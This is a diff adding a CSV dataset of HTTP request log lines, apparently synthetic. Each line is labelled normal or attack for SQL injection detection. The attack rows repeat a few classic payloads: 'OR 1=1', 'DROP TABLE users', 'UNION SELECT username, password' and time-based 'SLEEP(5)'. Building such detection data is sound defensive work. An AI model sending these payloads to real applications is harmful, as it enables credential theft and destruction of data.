@@ -1,0 +1,1001 @@
+log,label,type
+GET /product?id=77 HTTP/1.1,normal,SQLi
+GET /product?id=31 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=22 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=13 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=88 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=24 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=82 HTTP/1.1,normal,SQLi
+GET /product?id=21 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=52 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=6 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=3 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=91 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=46 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=73 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=86 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=18 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=41 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=4 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=62 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=50 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=83 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=48 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=73 HTTP/1.1,normal,SQLi
+GET /product?id=36 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=41 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=62 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=29 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=100 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=63 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=95 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=64 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=5 HTTP/1.1,normal,SQLi
+GET /product?id=7 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=56 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=65 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=83 HTTP/1.1,normal,SQLi
+GET /product?id=13 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=5 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=77 HTTP/1.1,normal,SQLi
+GET /product?id=80 HTTP/1.1,normal,SQLi
+GET /product?id=81 HTTP/1.1,normal,SQLi
+GET /product?id=13 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=92 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=10 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=11 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=54 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=82 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=90 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=64 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=13 HTTP/1.1,normal,SQLi
+GET /product?id=29 HTTP/1.1,normal,SQLi
+GET /product?id=29 HTTP/1.1,normal,SQLi
+GET /product?id=18 HTTP/1.1,normal,SQLi
+GET /product?id=55 HTTP/1.1,normal,SQLi
+GET /product?id=95 HTTP/1.1,normal,SQLi
+GET /product?id=38 HTTP/1.1,normal,SQLi
+GET /product?id=68 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=97 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=81 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=39 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=77 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=20 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=73 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=37 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=9 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=7 HTTP/1.1,normal,SQLi
+GET /product?id=71 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=82 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=57 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=62 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=73 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=94 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=24 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=86 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=37 HTTP/1.1,normal,SQLi
+GET /product?id=41 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=40 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=35 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=40 HTTP/1.1,normal,SQLi
+GET /product?id=86 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=88 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=45 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=4 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=78 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=66 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=48 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=55 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=65 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=91 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=47 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=20 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=41 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=48 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=28 HTTP/1.1,normal,SQLi
+GET /product?id=73 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=52 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=44 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=14 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=35 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=35 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=49 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=48 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /product?id=29 HTTP/1.1,normal,SQLi
+GET /product?id=22 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=2 HTTP/1.1,normal,SQLi
+GET /product?id=23 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=37 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=75 HTTP/1.1,normal,SQLi
+GET /product?id=91 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=1 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=97 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=4 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=16 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=66 HTTP/1.1,normal,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=47 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=65 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=75 HTTP/1.1,normal,SQLi
+GET /product?id=41 HTTP/1.1,normal,SQLi
+GET /product?id=70 HTTP/1.1,normal,SQLi
+GET /product?id=25 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+"GET /index.php?id=1UNION SELECT username, password FROM users HTTP/1.1",attack,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=89 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=57 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /product?id=16 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=89 HTTP/1.1,normal,SQLi
+GET /product?id=27 HTTP/1.1,normal,SQLi
+GET /index.php?id=1AND SLEEP(5) HTTP/1.1,attack,SQLi
+GET /product?id=20 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR 1=1-- HTTP/1.1,attack,SQLi
+GET /product?id=61 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=93 HTTP/1.1,normal,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /index.php?id=1'; DROP TABLE users HTTP/1.1,attack,SQLi
+GET /product?id=83 HTTP/1.1,normal,SQLi
+GET /product?id=95 HTTP/1.1,normal,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
+GET /index.php?id=1' OR '1'='1 HTTP/1.1,attack,SQLi
